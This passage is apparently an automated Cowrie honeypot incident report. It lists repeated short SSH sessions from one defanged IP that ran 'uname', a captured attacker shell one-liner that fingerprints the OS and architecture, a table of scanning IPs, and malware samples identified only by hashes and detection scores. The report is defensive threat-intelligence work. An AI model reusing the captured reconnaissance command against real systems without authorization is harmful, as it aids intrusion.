| `2026-08-15 06:53:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af165839eb22

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:53 |
| **Last Seen** | 2026-08-15 06:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:53:43` | `cowrie.session.connect` |
| `2026-08-15 06:53:43` | `cowrie.client.version` |
| `2026-08-15 06:53:43` | `cowrie.client.kex` |
| `2026-08-15 06:53:44` | `cowrie.login.success` |
| `2026-08-15 06:53:45` | `cowrie.session.params` |
| `2026-08-15 06:53:45` | `cowrie.command.input` |
| `2026-08-15 06:53:45` | `cowrie.log.closed` |
| `2026-08-15 06:53:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32f2d6f13f47

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:53 |
| **Last Seen** | 2026-08-15 06:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:53:49` | `cowrie.session.connect` |
| `2026-08-15 06:53:49` | `cowrie.client.version` |
| `2026-08-15 06:53:49` | `cowrie.client.kex` |
| `2026-08-15 06:53:50` | `cowrie.login.success` |
| `2026-08-15 06:53:51` | `cowrie.session.params` |
| `2026-08-15 06:53:51` | `cowrie.command.input` |
| `2026-08-15 06:53:52` | `cowrie.log.closed` |
| `2026-08-15 06:53:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2676ac7e58e7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:53 |
| **Last Seen** | 2026-08-15 06:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:53:55` | `cowrie.session.connect` |
| `2026-08-15 06:53:55` | `cowrie.client.version` |
| `2026-08-15 06:53:55` | `cowrie.client.kex` |
| `2026-08-15 06:53:56` | `cowrie.login.success` |
| `2026-08-15 06:53:57` | `cowrie.session.params` |
| `2026-08-15 06:53:57` | `cowrie.command.input` |
| `2026-08-15 06:53:57` | `cowrie.log.closed` |
| `2026-08-15 06:53:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b31b7e139d2d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:54 |
| **Last Seen** | 2026-08-15 06:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:54:01` | `cowrie.session.connect` |
| `2026-08-15 06:54:01` | `cowrie.client.version` |
| `2026-08-15 06:54:01` | `cowrie.client.kex` |
| `2026-08-15 06:54:02` | `cowrie.login.success` |
| `2026-08-15 06:54:03` | `cowrie.session.params` |
| `2026-08-15 06:54:03` | `cowrie.command.input` |
| `2026-08-15 06:54:03` | `cowrie.log.closed` |
| `2026-08-15 06:54:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-895abd45c01d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:54 |
| **Last Seen** | 2026-08-15 06:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:54:06` | `cowrie.session.connect` |
| `2026-08-15 06:54:07` | `cowrie.client.version` |
| `2026-08-15 06:54:07` | `cowrie.client.kex` |
| `2026-08-15 06:54:07` | `cowrie.login.success` |
| `2026-08-15 06:54:09` | `cowrie.session.params` |
| `2026-08-15 06:54:09` | `cowrie.command.input` |
| `2026-08-15 06:54:09` | `cowrie.log.closed` |
| `2026-08-15 06:54:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d860bc1541d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:54 |
| **Last Seen** | 2026-08-15 06:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:54:12` | `cowrie.session.connect` |
| `2026-08-15 06:54:12` | `cowrie.client.version` |
| `2026-08-15 06:54:12` | `cowrie.client.kex` |
| `2026-08-15 06:54:13` | `cowrie.login.success` |
| `2026-08-15 06:54:14` | `cowrie.session.params` |
| `2026-08-15 06:54:14` | `cowrie.command.input` |
| `2026-08-15 06:54:14` | `cowrie.log.closed` |
| `2026-08-15 06:54:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e74ee2812a8c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:54 |
| **Last Seen** | 2026-08-15 06:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:54:18` | `cowrie.session.connect` |
| `2026-08-15 06:54:18` | `cowrie.client.version` |
| `2026-08-15 06:54:18` | `cowrie.client.kex` |
| `2026-08-15 06:54:19` | `cowrie.login.success` |
| `2026-08-15 06:54:21` | `cowrie.session.params` |
| `2026-08-15 06:54:21` | `cowrie.command.input` |
| `2026-08-15 06:54:21` | `cowrie.log.closed` |
| `2026-08-15 06:54:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d66d33b5383d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:54 |
| **Last Seen** | 2026-08-15 06:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:54:23` | `cowrie.session.connect` |
| `2026-08-15 06:54:24` | `cowrie.client.version` |
| `2026-08-15 06:54:24` | `cowrie.client.kex` |
| `2026-08-15 06:54:26` | `cowrie.login.success` |
| `2026-08-15 06:54:27` | `cowrie.session.params` |
| `2026-08-15 06:54:27` | `cowrie.command.input` |
| `2026-08-15 06:54:28` | `cowrie.log.closed` |
| `2026-08-15 06:54:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58a4c818bf31

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:54 |
| **Last Seen** | 2026-08-15 06:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:54:29` | `cowrie.session.connect` |
| `2026-08-15 06:54:29` | `cowrie.client.version` |
| `2026-08-15 06:54:29` | `cowrie.client.kex` |
| `2026-08-15 06:54:31` | `cowrie.login.success` |
| `2026-08-15 06:54:33` | `cowrie.session.params` |
| `2026-08-15 06:54:33` | `cowrie.command.input` |
| `2026-08-15 06:54:33` | `cowrie.log.closed` |
| `2026-08-15 06:54:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2204dbc15f7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:54 |
| **Last Seen** | 2026-08-15 06:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:54:35` | `cowrie.session.connect` |
| `2026-08-15 06:54:35` | `cowrie.client.version` |
| `2026-08-15 06:54:35` | `cowrie.client.kex` |
| `2026-08-15 06:54:37` | `cowrie.login.success` |
| `2026-08-15 06:54:38` | `cowrie.session.params` |
| `2026-08-15 06:54:38` | `cowrie.command.input` |
| `2026-08-15 06:54:39` | `cowrie.log.closed` |
| `2026-08-15 06:54:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-656fb105df3d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:54 |
| **Last Seen** | 2026-08-15 06:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:54:41` | `cowrie.session.connect` |
| `2026-08-15 06:54:41` | `cowrie.client.version` |
| `2026-08-15 06:54:41` | `cowrie.client.kex` |
| `2026-08-15 06:54:42` | `cowrie.login.success` |
| `2026-08-15 06:54:43` | `cowrie.session.params` |
| `2026-08-15 06:54:43` | `cowrie.command.input` |
| `2026-08-15 06:54:43` | `cowrie.log.closed` |
| `2026-08-15 06:54:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4206023536b2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:54 |
| **Last Seen** | 2026-08-15 06:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:54:47` | `cowrie.session.connect` |
| `2026-08-15 06:54:47` | `cowrie.client.version` |
| `2026-08-15 06:54:47` | `cowrie.client.kex` |
| `2026-08-15 06:54:48` | `cowrie.login.success` |
| `2026-08-15 06:54:49` | `cowrie.session.params` |
| `2026-08-15 06:54:49` | `cowrie.command.input` |
| `2026-08-15 06:54:50` | `cowrie.log.closed` |
| `2026-08-15 06:54:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7082991a1366

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:54 |
| **Last Seen** | 2026-08-15 06:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:54:52` | `cowrie.session.connect` |
| `2026-08-15 06:54:53` | `cowrie.client.version` |
| `2026-08-15 06:54:53` | `cowrie.client.kex` |
| `2026-08-15 06:54:54` | `cowrie.login.success` |
| `2026-08-15 06:54:54` | `cowrie.session.params` |
| `2026-08-15 06:54:54` | `cowrie.command.input` |
| `2026-08-15 06:54:54` | `cowrie.log.closed` |
| `2026-08-15 06:54:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cecaa259b5d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:54 |
| **Last Seen** | 2026-08-15 06:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:54:59` | `cowrie.session.connect` |
| `2026-08-15 06:54:59` | `cowrie.client.version` |
| `2026-08-15 06:54:59` | `cowrie.client.kex` |
| `2026-08-15 06:55:00` | `cowrie.login.success` |
| `2026-08-15 06:55:01` | `cowrie.session.params` |
| `2026-08-15 06:55:01` | `cowrie.command.input` |
| `2026-08-15 06:55:02` | `cowrie.log.closed` |
| `2026-08-15 06:55:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🟡 MEDIUM · IR-089726a381aa

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-15 04:55 |
| **Last Seen** | 2026-08-15 04:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 0 |
| **Auth Success** | ❌ No |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1083 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 04:55:04` | `cowrie.session.params` |
| `2026-08-15 04:55:04` | `cowrie.command.input` |
| `2026-08-15 04:55:04` | `cowrie.command.input` |
| `2026-08-15 04:55:04` | `cowrie.command.input` |
| `2026-08-15 04:55:04` | `cowrie.command.input` |
| `2026-08-15 04:55:04` | `cowrie.command.input` |
| `2026-08-15 04:55:04` | `cowrie.command.success` |
| `2026-08-15 04:55:04` | `cowrie.command.input` |
| `2026-08-15 04:55:04` | `cowrie.command.input` |
| `2026-08-15 04:55:04` | `cowrie.command.input` |
| `2026-08-15 04:55:04` | `cowrie.command.input` |
| `2026-08-15 04:55:05` | `cowrie.log.closed` |
| `2026-08-15 04:55:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Monitor for repeat activity from `92.118.39[.]14`
- [ ] No immediate escalation required

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `80.251.153[.]178` | **6272** | 2026-08-15 04:55 | 2026-08-15 06:55 | 7456m | 0 | `T1592` | 🟠 MEDIUM |
| `34.38.185[.]57` | **10** | 2026-08-15 05:41 | 2026-08-15 05:41 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `210.16.100[.]120` | **6** | 2026-08-15 06:03 | 2026-08-15 06:27 | 3m | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | **6** | 2026-08-15 06:41 | 2026-08-15 06:46 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **4** | 2026-08-15 05:07 | 2026-08-15 06:28 | 0m | 0 | `T1592` | 🟢 LOW |
| `188.129.80[.]13` | **3** | 2026-08-15 06:48 | 2026-08-15 06:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]161` | **3** | 2026-08-15 05:48 | 2026-08-15 05:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `46.36.123[.]59` | **3** | 2026-08-15 06:30 | 2026-08-15 06:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]121` | **3** | 2026-08-15 05:32 | 2026-08-15 05:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `107.150.146[.]69` | **2** | 2026-08-15 04:55 | 2026-08-15 06:11 | 0m | 0 | `T1592` | 🟢 LOW |
| `18.116.101[.]220` | **2** | 2026-08-15 05:47 | 2026-08-15 05:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.96.139[.]8` | **2** | 2026-08-15 06:41 | 2026-08-15 06:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.64.104[.]251` | **2** | 2026-08-15 05:22 | 2026-08-15 05:23 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]85` | **2** | 2026-08-15 06:25 | 2026-08-15 06:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]50` | **2** | 2026-08-15 05:13 | 2026-08-15 05:40 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.68.22[.]115` | 1 | 2026-08-15 05:08 | 2026-08-15 05:08 | 15s | 0 | `T1592` | 🟢 LOW |
| `112.31.167[.]120` | 1 | 2026-08-15 05:33 | 2026-08-15 05:33 | 11s | 0 | `T1592` | 🟢 LOW |
| `115.190.166[.]122` | 1 | 2026-08-15 05:27 | 2026-08-15 05:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `116.114.84[.]246` | 1 | 2026-08-15 05:00 | 2026-08-15 05:00 | 1s | 0 | `T1592` | 🟢 LOW |
| `117.191.83[.]250` | 1 | 2026-08-15 05:37 | 2026-08-15 05:38 | 72s | 0 | `T1592` | 🟢 LOW |
| `159.224.240[.]235` | 1 | 2026-08-15 06:37 | 2026-08-15 06:37 | 14s | 0 | `T1592` | 🟢 LOW |
| `177.72.46[.]225` | 1 | 2026-08-15 05:32 | 2026-08-15 05:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.210.206[.]32` | 1 | 2026-08-15 05:53 | 2026-08-15 05:53 | 7s | 0 | `T1592` | 🟢 LOW |
| `181.161.92[.]237` | 1 | 2026-08-15 05:04 | 2026-08-15 05:04 | 10s | 0 | `T1592` | 🟢 LOW |
| `182.252.140[.]114` | 1 | 2026-08-15 05:19 | 2026-08-15 05:19 | 6s | 0 | `T1592` | 🟢 LOW |
| `2.55.126[.]88` | 1 | 2026-08-15 06:04 | 2026-08-15 06:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]238` | 1 | 2026-08-15 06:35 | 2026-08-15 06:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `212.73.75[.]82` | 1 | 2026-08-15 05:11 | 2026-08-15 05:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `216.218.219[.]164` | 1 | 2026-08-15 06:02 | 2026-08-15 06:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `34.52.159[.]185` | 1 | 2026-08-15 05:41 | 2026-08-15 05:41 | 8s | 0 | `T1592` | 🟢 LOW |
| `37.57.145[.]218` | 1 | 2026-08-15 06:48 | 2026-08-15 06:48 | 14s | 0 | `T1592` | 🟢 LOW |
| `61.184.128[.]210` | 1 | 2026-08-15 04:56 | 2026-08-15 04:56 | 10s | 0 | `T1592` | 🟢 LOW |
| `78.67.161[.]64` | 1 | 2026-08-15 06:50 | 2026-08-15 06:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `83.255.209[.]245` | 1 | 2026-08-15 06:16 | 2026-08-15 06:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | 1 | 2026-08-15 05:35 | 2026-08-15 05:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.92.40[.]202` | 1 | 2026-08-15 05:26 | 2026-08-15 05:26 | 8s | 0 | `T1592` | 🟢 LOW |
| `91.92.42[.]7` | 1 | 2026-08-15 06:46 | 2026-08-15 06:46 | 8s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]14` | 1 | 2026-08-15 04:58 | 2026-08-15 04:58 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 81/100 | 🔴 HIGH | **28/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **23/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
